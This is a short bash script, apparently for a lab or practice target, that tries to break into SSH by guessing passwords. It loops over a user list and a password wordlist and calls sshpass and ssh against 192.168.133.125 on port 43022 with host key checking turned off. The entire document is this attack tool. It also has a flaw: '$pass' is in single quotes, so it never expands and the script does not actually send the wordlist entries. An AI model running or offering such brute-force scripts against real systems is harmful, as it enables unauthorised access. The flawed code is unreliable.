#!/bin/bash

users=$(cat users.txt)
passwords=$(cat wordlist.txt)

for user in $users; do for pass in $passwords; do
	sudo sshpass -v -p '$pass' ssh -o StrictHostKeyChecking=no $user@192.168.133.125 -p 43022	
done
done

